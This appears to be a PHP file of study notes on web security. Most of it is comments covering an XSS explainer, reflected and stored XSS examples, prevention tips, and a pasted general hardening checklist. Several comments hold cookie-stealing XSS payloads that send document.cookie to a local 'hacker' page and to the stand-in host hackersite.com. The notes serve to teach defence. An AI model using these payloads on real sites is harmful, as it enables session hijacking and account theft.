<?php
/**
 * PHP Website security & Hacking Prevention
 * 1 principle of least privilege
 * 2 password and encryption
 * 3 data hiding 
 * 4 secrity though obdcurity
 * 5 account lock attacks
 * 6 brute force attacs
 * 7 modified requesr
 * 8 error reporting
 * 9 forced browsing
 * 10 path traversal
 * 11 daa parameter delimiters
 * 12 sql/php injection attacks
 * 13 xss attacks
 * 14 session hijack fixation
 * 15 phishoong
 * 16 general security principles
 * 
 * 
 * PHP Security include/requrie 
 *  : 127.0.0.1/scurity/db/db.php 
 *     then will be used 127.0.0.1/scurity/db/db.inc : view all php code and not scure data
 *      db.php
 *      $db=new PDO('mysql:host=127.0.0.1;dbname=test','root','password')
 *
 * 
 * --------------------------------------------------------------
 * XSS :Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the
*       code of a trusted application or website. Attackers often initiate an XSS attack by sending a malicious
*       link to a user and enticing the user to click it. If the app or website lacks proper data sanitization, the
*       malicious link executes the attacker’s chosen code on the user’s system. As a result, the attacker can
*       steal the user’s active session cookie
 *      
 * 
 *  
 */
/*<script>window.location.href='http://localhost/php-practical-work/phpsecurity/xss/hacker?cookie='+document.cookie</script>
<script>
fetch("http://localhost/php-practical-work/php-security/xss/storedxss/hacker/index.php?cookie="+document.cookie);
</script>
*/
/*
Reflected cross-site scripting (or XSS)
    arises when an application receives data in an HTTP
    request and includes that data within the immediate response in an unsafe way.
    The malicious script does not reside in the application and does not persist. The victim’s
    browser executes the attack only if the user opens a web page or link set up by the
    attacker.
        Reflected XSS attacks are the most common type of XSS in the real world. They are also
        known as Type 1, first-order, or non-persistent XSS. A single browser request and response
        delivers and executes the attack payload. The maliciously crafted HTTP or URI parameters
        contain an attack string that the legitimate application processes improperly.
        Suppose a website has a search function which receives the user-supplied search term in
        URL parameter:
    https://insecure-website.com/search?term=gift
    The application echoes the supplied search term in the response to this URL:
    <p>You searched for: gift</p>
Assuming the application doesn't perform any other processing of the data, an attacker can
construct an attack like this:

https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
/*This URL results in the following response:
<p>You searched for: <script>/* Bad stuff here... */</script></p>
/*If another user of the application requests the attacker's URL, then the script supplied by
the attacker will execute in the victim user's browser, in the context of their session with
the application.

Stored XSS:
    Stored cross-site scripting (also known as second-order or persistent XSS) arises when an
    application receives data from an untrusted source and includes that data within its later
    HTTP responses in an unsafe way.
    Suppose a website allows users to submit comments on blog posts, which are displayed to
    other users.
Example:
The attacker adds the following comment: Great price for a great item! Read my review
here <script src=”http://hackersite.com/authstealer.js”> </script>.
<script>
fetch("http://hackersite.com/php-security/xss/storedxss/hacker/index.php?cookie="+document.cookie);
</script>
Impact of XSS V

The impact of an XSS vulnerability depends on the type of application. Here is how an XSS
attack will affect three types of web applications:
    • Static content—in a web application with static content, such as a news site with no
    login functionality, XSS will have minimal impact, because all users are anonymous and
    information is publicly available.
    • Sensitive data—if an application stores sensitive user data, such as financial or health
    services, XSS can do major damage because it can allow attackers to compromise user
    accounts.
    • Privileged users—if an attacker can use XSS to take over the session of a privileged user,
    such as the web application administrator, they can gain full control over the
    application and compromise all its data.


      $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;

    XSS Prevention:
Here are a few steps you can take to prevent XSS in your web applications:
• Sanitizing Inputs
• Use HTTPOnly Cookie Flag
• Implement Content Security Policy
• X-XSS-Protection Header
------------------------------------------------------

Certainly! Ensuring the security of a PHP website is crucial to prevent hacking and unauthorized access. Here are some key measures you can take:

    Keep PHP Updated: Regularly update your PHP version to the latest stable release to benefit from security patches and improvements.
    
    Use HTTPS:Encrypt data transmission by implementing HTTPS. Obtain an SSL/TLS certificate for your website to secure communication between the server and users.
    
    Input Validation:Validate and sanitize user input to prevent SQL injection, XSS (Cross-Site Scripting), and other injection attacks.
    
    Output Escaping:Escape output to prevent Cross-Site Scripting attacks. Use functions like htmlspecialchars() to encode user-generated content before displaying it.
    
    Secure File Uploads:If your website allows file uploads, ensure that uploads are restricted to specific file types, and implement measures to scan and verify uploaded files for malicious content.
    
    Database Security:Use parameterized queries or prepared statements to prevent SQL injection. Implement strong, unique passwords for database access, and limit database user permissions.
    
    Session Management:Use secure session handling practices, such as session_regenerate_id(), and store session data securely. Avoid exposing sensitive session information in URLs.
    
    Secure Configuration:Review and configure your server and PHP settings securely. Disable unnecessary PHP functions, and ensure error reporting is appropriately configured for production environments.
    
    Brute Force Protection:Implement measures to prevent brute force attacks, such as account lockouts or CAPTCHA challenges after multiple failed login attempts.
    
    Security Headers:Use HTTP security headers like Content Security Policy (CSP), Strict-Transport-Security (HSTS), and X-Content-Type-Options to enhance browser security.
    
    Regular Backups:Regularly back up your website and database. In case of a security incident, having up-to-date backups can help restore your site quickly.
    
    Monitoring and Logging:Set up monitoring for unusual activities and regularly review logs for any signs of suspicious behavior. This can help in identifying and mitigating security threats.
    
    Security Frameworks:Consider using security frameworks or libraries for PHP, such as OWASP PHP Security Project, to incorporate best practices into your code.
    
    Stay Informed:Stay updated on the latest security threats and vulnerabilities. Follow best practices and be proactive in applying security updates and patches


